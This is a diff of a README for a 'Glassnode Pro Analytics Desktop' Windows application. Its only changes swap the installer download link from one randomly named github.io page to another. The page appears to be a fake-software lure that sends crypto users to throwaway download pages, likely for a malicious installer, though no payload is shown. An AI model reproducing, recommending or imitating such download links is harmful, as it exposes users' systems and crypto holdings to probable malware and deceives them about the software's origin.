@@ -2,7 +2,7 @@
 
 **Glassnode Pro Analytics Desktop** is a powerful Windows desktop application designed to bring the full depth of cryptocurrency on-chain analytics directly to your local machine. Whether you are a seasoned trader, a blockchain researcher, or a crypto enthusiast, this tool provides you with comprehensive insights into Bitcoin, Ethereum, and hundreds of other digital assets through real-time data visualization, advanced metrics, and customizable dashboards.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
@@ -67,7 +67,7 @@ The tool supports Bitcoin (BTC), Ethereum (ETH), Solana (SOL), and over 200 addi
 
 ## 📥 Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
